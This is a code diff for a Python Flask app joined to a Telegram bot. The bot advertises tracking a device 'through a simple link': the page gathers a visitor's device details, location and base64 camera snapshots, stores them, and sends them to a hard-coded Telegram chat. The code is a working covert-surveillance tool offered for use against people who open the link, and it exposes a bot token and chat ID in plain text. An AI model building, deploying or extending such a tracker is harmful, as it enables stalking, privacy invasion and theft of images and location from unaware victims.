@@ -1,76 +1,68 @@
-from flask import Flask, request, jsonify, render_template
 import os
-import base64
 import json
+import base64
 import requests
+import asyncio
 from datetime import datetime
+from threading import Thread
+from flask import Flask, request, jsonify, render_template
 
+# Aiogram (Telegram Bot)
+from aiogram import Bot, Dispatcher, types
+from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
+from aiogram.utils import executor
+
+# Load Bot Token from Environment Variables
+API_TOKEN = "7842091597:AAGtnLil1fTmAy_sk__U5yQoun0f8-WBjSA"
+CHAT_ID = "1901173676"
+
+# Initialize Telegram Bot
+bot = Bot(token=API_TOKEN)
+dp = Dispatcher(bot)
+
+# Flask App
 app = Flask(__name__)
 
-# Create directories in /tmp (Vercel's writable directory)
+# Directories for Temporary File Storage
 PHOTO_DIR = "/tmp/captured_photos"
 INFO_DIR = "/tmp/client_info"
 os.makedirs(PHOTO_DIR, exist_ok=True)
 os.makedirs(INFO_DIR, exist_ok=True)
 
-# Telegram Bot Configuration
-TELEGRAM_BOT_TOKEN = '7842091597:AAGtnLil1fTmAy_sk__U5yQoun0f8-WBjSA'  # Replace with your bot's API token
-CHAT_ID = '1901173676'  # Replace with the target chat ID where you want to send messages
+### --- TELEGRAM BOT COMMAND HANDLERS --- ###
 
-# Function to send a text message via Telegram
-def send_telegram_message(message):
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    payload = {
-        'chat_id': CHAT_ID,
-        'text': message
-    }
-    response = requests.post(url, data=payload)
-    return response.json()
+# Custom Keyboard
+keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
+keyboard.add(
+    KeyboardButton("Device + Camera + Location"),
+    KeyboardButton("Camera + Location"),
+    KeyboardButton("Location + Device")
+)
+keyboard.add(
+    KeyboardButton("Camera img"),
+    KeyboardButton("Device info"),
+    KeyboardButton("Location only")
+)
+keyboard.add(KeyboardButton("Main Menu"))
 
-# Function to send a photo via Telegram
-def send_telegram_photo(photo_path):
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
-    with open(photo_path, 'rb') as photo:
-        files = {'photo': photo}
-        payload = {'chat_id': CHAT_ID}
-        response = requests.post(url, data=payload, files=files)
-    return response.json()
+@dp.message_handler(commands=['start'])
+async def start_command(message: types.Message):
+    text = (
+        "This bot allows you to track a device effortlessly through a simple link.\n"
+        "It can collect details such as IP address, location, camera snapshots, battery status, "
+        "network information, and more."
+    )
+    await message.reply(text, reply_markup=keyboard)
 
-# Handler for the `/start` command
-def handle_start(chat_id):
-    message = "Welcome to the bot! Type /help to get a list of commands."
-    send_telegram_message(message)
-
-# Handler for the `/help` command
-def handle_help(chat_id):
-    message = "/start - Start the bot\n/help - Show this help message\n/info - Get bot info"
-    send_telegram_message(message)
-
-# Handler for the `/info` command
-def handle_info(chat_id):
-    message = "This is a simple bot for collecting client info and uploading photos. Use /help to see available commands."
-    send_telegram_message(message)
-
-# Function to process updates from Telegram
-def process_message(message):
-    chat_id = message.get('chat', {}).get('id', None)
-    text = message.get('text', '').lower()
-
-    if '/start' in text:
-        handle_start(chat_id)
-    elif '/help' in text:
-        handle_help(chat_id)
-    elif '/info' in text:
-        handle_info(chat_id)
-    else:
-        send_telegram_message("Sorry, I didn't understand that. Type /help to see available commands.")
+### --- FLASK ROUTES --- ###
 
 @app.route("/")
 def index():
-    return render_template("index.html")  # Ensure 'index.html' is in the 'templates' folder
+    return render_template("index.html")  # Ensure 'index.html' exists in 'templates/' folder
 
 @app.route("/collect", methods=["POST"])
 def collect_info():
+    """Collects device info from client"""
     try:
         data = request.json
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -78,8 +70,8 @@ def collect_info():
         
         with open(filename, "w") as f:
             json.dump(data, f, indent=4)
-        
-        # Send the collected data to Telegram
+
+        # Send collected info to Telegram
         message = f"New client information collected:\n\n{json.dumps(data, indent=4)}"
         send_telegram_message(message)
 
@@ -89,6 +81,7 @@ def collect_info():
 
 @app.route("/upload-photo", methods=["POST"])
 def upload_photo():
+    """Uploads a photo and sends it to Telegram"""
     try:
         data = request.json
         photo_data = data.get("photo", "")
@@ -103,7 +96,7 @@ def upload_photo():
 
         with open(filename, "wb") as f:
             f.write(img_data)
-        
+
         # Send the photo to Telegram
         send_telegram_photo(filename)
 
@@ -111,15 +104,36 @@ def upload_photo():
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
-@app.route("/webhook", methods=["POST"])
-def webhook():
-    try:
-        update = request.json
-        if 'message' in update:
-            process_message(update['message'])
-        return jsonify({"status": "success"}), 200
-    except Exception as e:
-        return jsonify({"error": str(e)}), 500
+### --- TELEGRAM MESSAGE HANDLING --- ###
+def send_telegram_message(message):
+    """Sends a text message to Telegram"""
+    url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
+    payload = {'chat_id': CHAT_ID, 'text': message}
+    requests.post(url, data=payload)
+
+def send_telegram_photo(photo_path):
+    """Sends a photo to Telegram"""
+    url = f"https://api.telegram.org/bot{API_TOKEN}/sendPhoto"
+    with open(photo_path, 'rb') as photo:
+        files = {'photo': photo}
+        payload = {'chat_id': CHAT_ID}
+        requests.post(url, data=payload, files=files)
+
+### --- RUNNING FLASK AND AIROGRAM IN PARALLEL --- ###
+def run_flask():
+    """Runs Flask in a separate thread"""
+    app.run(host="0.0.0.0", port=5000, debug=False)
+
+def run_telegram():
+    """Runs the Telegram bot with aiogram"""
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    executor.start_polling(dp, skip_updates=True)
 
 if __name__ == "__main__":
-    app.run(debug=True)
+    # Start Flask in a separate thread
+    flask_thread = Thread(target=run_flask)
+    flask_thread.start()
+
+    # Start Aiogram bot
+    run_telegram()
